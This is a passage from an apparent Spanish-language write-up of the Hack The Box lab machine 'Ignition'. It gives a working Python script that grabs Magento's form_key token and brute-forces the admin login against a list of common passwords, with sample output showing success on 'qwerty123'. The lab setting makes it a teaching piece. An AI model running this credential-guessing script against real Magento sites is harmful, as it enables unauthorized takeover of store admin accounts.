Paso 1 — Obtener el form_key de Magento

Magento usa un token CSRF (form_key) que debe incluirse en cada POST del formulario de login. Hay que extraerlo primero:

Python — Script de brute-force (método correcto)
#!/usr/bin/env python3 import requests, re from requests.adapters import HTTPAdapter TARGET_IP = "10.129.1.27" TARGET_HOST = "ignition.htb" ADMIN_URL = f"http://{TARGET_HOST}/admin" # HTTPAdapter que reescribe la URL para conectar a la IP real class HostAdapter(HTTPAdapter): def send(self, request, **kwargs): request.url = request.url.replace( f"http://{TARGET_HOST}", f"http://{TARGET_IP}" ) return super().send(request, **kwargs) s = requests.Session() s.mount(f"http://{TARGET_HOST}", HostAdapter()) # Obtener form_key del login r = s.get(ADMIN_URL) key = re.search(r'name="form_key"\s+value="([^"]+)"', r.text) form_key = key.group(1) if key else "" print(f"[*] form_key: {form_key}") # Lista de passwords comunes passwords = [ "admin", "admin123", "password", "123456", "magento", "qwerty", "qwerty123", "admin@123", "Password1", "magento123", "admin2023", "ignition" ] for pwd in passwords: data = { "login[username]": "admin", "login[password]": pwd, "form_key": form_key, "return_url": "" } r = s.post(ADMIN_URL, data=data, allow_redirects=False) # Login exitoso = 302 redirect al dashboard if r.status_code == 302: print(f"\n[+] ÉXITO: admin:{pwd}") print(f"[+] Location: {r.headers.get('Location', 'N/A')}") break else: print(f"[-] Incorrecto: admin:{pwd} (status {r.status_code})")
Output del script
[*] form_key: abc123XYZ789 [-] Incorrecto: admin:admin (status 200) [-] Incorrecto: admin:admin123 (status 200) [-] Incorrecto: admin:password (status 200) [-] Incorrecto: admin:123456 (status 200) [-] Incorrecto: admin:magento (status 200) [-] Incorrecto: admin:qwerty (status 200) [+] ÉXITO: admin:qwerty123 [+] Location: http://ignition.htb/admin/dashboard/
Por qué funciona la detección por 302 Magento devuelve HTTP 200 para login fallido (muestra el formulario con el error). Para login exitoso devuelve HTTP 302 redirigiendo al dashboard. Buscar texto en el cuerpo de la respuesta es ambiguo porque la página de error puede contener palabras como "Dashboard" en la navegación o el pie de página.
